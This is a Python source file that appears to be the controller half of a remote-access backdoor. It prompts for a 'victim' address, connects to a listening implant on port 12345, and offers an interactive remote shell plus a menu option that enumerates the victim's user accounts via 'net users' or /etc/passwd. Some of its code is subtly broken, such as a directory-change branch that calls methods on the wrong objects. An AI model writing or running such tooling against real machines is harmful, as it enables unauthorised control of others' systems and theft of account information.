import socket



class Shell:

    def __init__(self):
        self._history = []
        self._command = ""
        self._next_command = True

    def send(self):
        self._history.append(self._command)
        s.send(self._command.encode("utf-8"))

    def receive(self):
        content = s.recv(4096).decode("utf-8")
        if content[2:] == "cd":
            malware_os.chdir(self._command[3:].decode("utf-8"))
        print(content)

    def history(self):
        print("The history of your commands is:\n")
        for element in self._history:
            print(element)

    def close(self):
        self._next_command = False

    def get_command(self):
        return self._command

    def set_command(self, command):
        self._command = command

    def get_next_command(self):
        return self._next_command

    def set_next_command(self, next_command):
        self._next_command = next_command


class GetInfo:

    def __init__(self, malware_os):
        self._os = malware_os

    def get_users(self):
        if self._os == "Windows":
            return "net users"
        elif self._os == "Linux":
            return "cut -d: -f1 /etc/passwd"


malware_addr = input("Enter the address of the victim: ")
serv_addr = (malware_addr, 12345)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(serv_addr)
print(s.recv(4096).decode('utf-8'))
s.send("os".encode("utf-8"))
malware_os = s.recv(4096).decode('utf-8')

getinfo = GetInfo(malware_os)
shell = Shell()

message = input(
    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
while message != "exit":
    if message == "1":
        shell.set_next_command(True)
        while shell.get_next_command():
            shell._command = input("Shell: ")
            while shell.get_command() == "":
                shell.set_command(input("Shell: "))
            if shell.get_command() == "exit":
                shell.close()
            if shell.get_command() == "history":
                shell.history()
            else:
                shell.send()
                shell.receive()
    elif message == "2":
        shell.set_command(getinfo.get_users())
        shell.send()
        shell.receive()

    message = input(
        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")

s.close()
